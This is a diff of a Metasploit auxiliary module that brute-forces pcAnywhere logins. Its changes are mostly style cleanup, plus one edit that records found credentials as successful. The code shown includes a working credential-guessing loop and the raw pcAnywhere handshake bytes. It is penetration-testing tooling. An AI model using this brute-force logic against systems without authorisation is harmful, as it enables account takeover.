@@ -39,11 +39,11 @@ class Metasploit3 < Msf::Auxiliary
 
     each_user_pass do |user, pass|
       next if user.blank? or pass.blank?
-      print_status "Trying #{user}:#{pass}"
+      print_status("Trying #{user}:#{pass}")
       result = do_login(user, pass)
       case result
       when :success
-        print_good "#{ip}:#{rport} Login Successful #{user}:#{pass}"
+        print_good("#{ip}:#{rport} Login Successful #{user}:#{pass}")
         report_cred(
           ip: rhost,
           port: datastore['RPORT'],
@@ -52,16 +52,16 @@ class Metasploit3 < Msf::Auxiliary
           password: pass,
         )
         return if datastore['STOP_ON_SUCCESS']
-        print_status "Waiting to Re-Negotiate Connection (this may take a minute)..."
+        print_status('Waiting to Re-Negotiate Connection (this may take a minute)...')
         select(nil, nil, nil, 40)
         connect
         hsr = pca_handshake(ip)
         return if hsr == :handshake_failed
       when :fail
-        print_status "#{ip}:#{rport} Login Failure #{user}:#{pass}"
+        print_status("#{ip}:#{rport} Login Failure #{user}:#{pass}")
       when :reset
-        print_status "#{ip}:#{rport} Login Failure #{user}:#{pass}"
-        print_status "Connection Reset Attempting to reconnect in 1 second"
+        print_status("#{ip}:#{rport} Login Failure #{user}:#{pass}")
+        print_status('Connection reset attempting to reconnect in 1 second')
         select(nil, nil, nil, 1)
         connect
         hsr = pca_handshake(ip)
@@ -90,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -110,18 +110,18 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     # Check if we are now at the password prompt
-    unless res and res.include? "Enter password"
-      print_error "Problem Sending Login: #{res.inspect}"
+    unless res and res.include? 'Enter password'
+      print_error("Problem Sending Login: #{res.inspect}")
       return :abort
     end
 
     epass = encryption_header(encrypt(pass))
     nsock.put(epass)
     res = nsock.get_once(-1,20)
-    if res.include? "Login unsuccessful"
+    if res.include? 'Login unsuccessful'
       disconnect()
       return :reset
-    elsif res.include? "Invalid login"
+    elsif res.include? 'Invalid login'
       return :fail
     else
       disconnect()
@@ -130,38 +130,38 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def pca_handshake(ip, nsock=self.sock)
-    print_status "Handshaking with the pcAnywhere service"
+    print_status('Handshaking with the pcAnywhere service')
     nsock.put("\x00\x00\x00\x00")
     res = nsock.get_once(-1,5)
-    unless res and res.include? "Please press <Enter>"
-      print_error "Handshake(1) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
+    unless res and res.include? 'Please press <Enter>'
+      print_error("Handshake(1) failed on Host #{ip} aborting. Error: #{res.inspect}")
       return :handshake_failed
     end
 
     nsock.put("\x6F\x06\xff")
     res = nsock.get_once(-1,5)
     unless res and res.include? "\x78\x02\x1b\x61"
-      print_error "Handshake(2) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
+      print_error("Handshake(2) failed on Host #{ip} aborting. Error: #{res.inspect}")
       return :handshake_failed
     end
 
     nsock.put("\x6f\x61\x00\x09\x00\xfe\x00\x00\xff\xff\x00\x00\x00\x00")
     res = nsock.get_once(-1,5)
     unless res and res == "\x1b\x62\x00\x02\x00\x00\x00"
-      print_error "Handshake(3) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
+      print_error("Handshake(3) failed on Host #{ip} aborting. Error: #{res.inspect}")
       return :handshake_failed
     end
 
     nsock.put("\x6f\x62\x01\x02\x00\x00\x00")
     res = nsock.get_once(-1,5)
     unless res and res.include? "\x00\x7D\x08"
-      print_error "Handshake(4) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
+      print_error("Handshake(4) failed on Host #{ip} aborting. Error: #{res.inspect}")
       return :handshake_failed
     end
 
     res = nsock.get_once(-1,5) unless pca_at_login?(res)
     unless pca_at_login?(res)
-      print_error "Handshake(5) failed on Host #{ip} aborting. (Error: #{res.inspect} )"
+      print_error("Handshake(5) failed on Host #{ip} aborting. Error: #{res.inspect}")
       return :handshake_failed
     end
   end
